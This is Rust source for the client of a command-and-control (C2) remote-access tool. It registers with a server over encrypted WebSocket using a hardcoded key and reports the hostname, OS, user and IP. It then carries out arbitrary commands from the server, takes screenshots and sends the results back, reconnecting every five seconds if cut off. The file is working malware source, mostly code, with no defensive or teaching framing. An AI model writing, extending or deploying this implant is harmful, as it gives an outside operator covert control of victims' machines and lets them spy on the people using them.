use std::time::Duration;
use std::io::Cursor;
use tokio::net::TcpStream;
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message, MaybeTlsStream, WebSocketStream};
use futures_util::{SinkExt, StreamExt};
use sysinfo::{System, SystemExt};
use log::{info, warn, error};
use url::Url;
use image::ImageFormat;

use c2_common::{Crypto, Command, Response, ClientInfo};

struct Client {
    ws: WebSocketStream<MaybeTlsStream<TcpStream>>,
    crypto: Crypto,
    client_info: ClientInfo,
    server_url: String,
}

impl Client {
    async fn new(server_url: &str) -> Result<Self, Box<dyn std::error::Error>> {
        let url = Url::parse(&format!("ws://{}/ws", server_url))?;
        let (ws, _) = connect_async(url).await?;
        
        let server_key = [85, 172, 38, 160, 226, 46, 39, 58, 94, 204, 187, 246, 168, 243, 98, 109, 202, 53, 12, 35, 54, 242, 176, 93, 61, 98, 44, 107, 246, 206, 139, 229];
        let crypto = Crypto::new(&server_key)?;
        
        let system = System::new_all();
        let client_info = ClientInfo {
            id: uuid::Uuid::new_v4(),
            hostname: system.host_name().unwrap_or_else(|| "unknown".to_string()),
            os: system.long_os_version().unwrap_or_else(|| "unknown".to_string()),
            user: whoami::username(),
            ip: local_ip_address::local_ip().map(|ip| ip.to_string()).unwrap_or_else(|_| "unknown".to_string()),
            last_seen: chrono::Utc::now().timestamp(),
        };
        
        Ok(Self {
            ws,
            crypto,
            client_info,
            server_url: server_url.to_string(),
        })
    }
    
    async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        info!(target: "client", "Connected to server: {}", self.server_url);
        
        // Send client info to server first
        let info_bytes = serde_json::to_vec(&self.client_info)?;
        info!(target: "client", "Sending client info: {:?}", self.client_info);
        let encrypted_info = self.crypto.encrypt(&info_bytes)?;
        self.ws.send(Message::Binary(encrypted_info)).await?;
        info!(target: "client", "Client info sent successfully");
        
        let mut interval = tokio::time::interval(Duration::from_secs(30));
        
        loop {
            tokio::select! {
                msg = self.ws.next() => {
                    match msg {
                        Some(Ok(Message::Binary(data))) => {
                            self.handle_message(&data).await?;
                        }
                        Some(Ok(Message::Close(_))) => {
                            info!(target: "client", "Connection closed by server");
                            break;
                        }
                        Some(Err(e)) => {
                            error!(target: "client", "WebSocket error: {:?}", e);
                            // Don't break, just continue and try to handle next message
                            continue;
                        }
                        None => {
                            info!(target: "client", "Connection terminated");
                            break;
                        }
                        _ => {}
                    }
                }
                _ = interval.tick() => {
                    self.send_heartbeat().await?;
                }
            }
        }
        
        Ok(())
    }
    
    async fn handle_message(&mut self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        info!(target: "client", "Received message of length: {}", data.len());
        match self.crypto.decrypt(data) {
            Ok(decrypted) => {
                info!(target: "client", "Successfully decrypted message: {:?}", String::from_utf8_lossy(&decrypted));
                if let Ok(command) = serde_json::from_slice::<Command>(&decrypted) {
                    info!(target: "client", "Parsed command: {:?}", command);
                    self.handle_command(command).await?;
                } else {
                    warn!(target: "client", "Failed to parse decrypted data as Command: {:?}", String::from_utf8_lossy(&decrypted));
                }
            }
            Err(e) => {
                warn!(target: "client", "Failed to decrypt message: {:?}", e);
            }
        }
        Ok(())
    }
    
    async fn handle_command(&mut self, command: Command) -> Result<(), Box<dyn std::error::Error>> {
        info!(target: "client", "Handling command: {:?}", command);
        let response = match command {
            Command::SystemInfo => {
                info!(target: "client", "Processing SystemInfo command");
                let system = System::new_all();
                Response::SystemInfo {
                    os: system.long_os_version().unwrap_or_else(|| "unknown".to_string()),
                    hostname: system.host_name().unwrap_or_else(|| "unknown".to_string()),
                    user: whoami::username(),
                }
            }
            Command::Execute { command, args } => {
                match execute_command(&command, &args).await {
                    Ok(output) => Response::Success {
                        output,
                        data: None,
                    },
                    Err(e) => Response::Error {
                        message: format!("Command execution failed: {}", e),
                    },
                }
            }
            Command::Screenshot => {
                match take_screenshot().await {
                    Ok(screenshot_data) => Response::Success {
                        output: "Screenshot captured".to_string(),
                        data: Some(screenshot_data),
                    },
                    Err(e) => Response::Error {
                        message: format!("Screenshot failed: {}", e),
                    },
                }
            }
            _ => Response::Error { 
                message: "Command not implemented".to_string() 
            },
        };
        
        self.send_response(response).await
    }
    
    async fn send_response(&mut self, response: Response) -> Result<(), Box<dyn std::error::Error>> {
        info!(target: "client", "Sending response: {:?}", response);
        let response_bytes = serde_json::to_vec(&response)?;
        let encrypted = self.crypto.encrypt(&response_bytes)?;
        
        info!(target: "client", "Sending encrypted response of length: {}", encrypted.len());
        self.ws.send(Message::Binary(encrypted)).await?;
        info!(target: "client", "Response sent successfully");
        Ok(())
    }
    
    async fn send_heartbeat(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Send empty heartbeat data instead of a command
        let heartbeat_data = b"heartbeat";
        let encrypted = self.crypto.encrypt(heartbeat_data)?;
        
        self.ws.send(Message::Binary(encrypted)).await?;
        Ok(())
    }
}

async fn execute_command(command: &str, args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    use tokio::process::Command;
    
    let output = Command::new(command)
        .args(args)
        .output()
        .await?;
    
    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    } else {
        Ok(String::from_utf8_lossy(&output.stderr).to_string())
    }
}

async fn take_screenshot() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    use scrap::{Capturer, Display};
    
    let display = Display::primary()?;
    let mut capturer = Capturer::new(display)?;
    
    // Get display dimensions first
    let width = capturer.width() as u32;
    let height = capturer.height() as u32;
    
    // Wait for a frame to be available
    let frame = capturer.frame()?;
    
    // Convert the frame to an image
    let image = image::RgbaImage::from_raw(
        width,
        height,
        frame.to_vec(),
    ).ok_or("Failed to create image from frame")?;
    
    let mut buffer = Cursor::new(Vec::new());
    image.write_to(&mut buffer, ImageFormat::Png)?;
    Ok(buffer.into_inner())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    
    let server_url = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "127.0.0.1:8080".to_string());
    
    loop {
        match Client::new(&server_url).await {
            Ok(mut client) => {
                if let Err(e) = client.run().await {
                    error!(target: "client", "Client error: {:?}", e);
                }
            }
            Err(e) => {
                error!(target: "client", "Failed to connect: {:?}", e);
            }
        }
        
        info!(target: "client", "Reconnecting in 5 seconds...");
        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}